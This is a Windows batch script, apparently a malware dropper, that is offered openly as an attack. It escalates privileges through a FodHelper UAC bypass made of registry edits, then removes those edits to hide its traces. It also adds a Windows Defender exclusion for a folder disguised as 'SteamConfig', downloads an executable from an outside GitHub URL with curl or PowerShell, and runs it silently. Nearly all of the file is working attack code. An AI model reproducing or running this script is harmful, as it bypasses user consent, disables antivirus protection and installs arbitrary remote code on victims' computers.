@echo off
setlocal

:: Phase 1: The Setup & Privilege Check
:: We define our nest and our weapon.

set "nest_folder=%USERPROFILE%\AppData\Local\SteamConfig"
set "payload_name=framework_service.exe"
set "payload_path=%nest_folder%\%payload_name%"
set "pwr_cmd=powershell.exe"
set "obfuscated_exclusion=Add-MpPreference -ExclusionPath '%nest_folder%'"

:: The classic check. If we can run this, we're already admin.
net session >nul 2>&1
if %errorlevel% == 0 (
    goto :ElevatedExecution
) else (
    echo [x] Insufficient privileges. Attempting to acquire...
    goto :BypassUAC
)


:: Phase 2: The UAC Bypass
:: If we're not admin, we don't ask. We take.
:: This hijacks a trusted process by manipulating the registry.

:BypassUAC
echo [+] Staging UAC bypass via FodHelper method...
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /d "" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "%~f0" /f >nul 2>&1

:: Trigger the hijack. FodHelper will now run this script with elevated privileges.
fodhelper.exe >nul 2>&1
exit /b


:: Phase 3: The Execution (Now with Power)
:: This section only runs once we are elevated.

:ElevatedExecution
echo [+] Privileges acquired. Executing as Administrator.

:: Clean up the registry keys we used for the bypass to hide our tracks.
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

:: Create the nest, if it doesn't already exist.
if not exist "%nest_folder%" mkdir "%nest_folder%"

:: Blind the guards. We exclude the entire folder, our nest.
%pwr_cmd% -ExecutionPolicy Bypass -WindowStyle Hidden -Command "%obfuscated_exclusion%" >nul 2>&1
echo [+] Defender exclusion set for %nest_folder%

:: Download the payload. Try curl first, fall back to PowerShell. More robust.
echo [+] Downloading payload...
curl -fsSL "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/main.exe" -o "%payload_path%" >nul 2>&1

if %errorlevel% neq 0 (
    echo [!] curl failed. Falling back to PowerShell...
    %pwr_cmd% -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/main.exe' -OutFile '%payload_path%'" >nul 2>&1
)

:: Sanity Check: Ensure the payload exists and is not an empty file.
if not exist "%payload_path%" (
    echo [!] CRITICAL: Payload download failed. Aborting.
    exit /b 1
)
for %%F in ("%payload_path%") do (
    if %%~zF LSS 1024 (
        echo [!] CRITICAL: Payload is empty or corrupt. Deleting and aborting.
        del "%payload_path%" >nul 2>&1
        exit /b 1
    )
)

echo [+] Payload successfully downloaded and verified.
echo [+] Unleashing the beast...

:: Execute the payload silently and detach from this console.
start "" /b "%payload_path%"

echo [+] Operation complete. Exiting.
exit /b 0
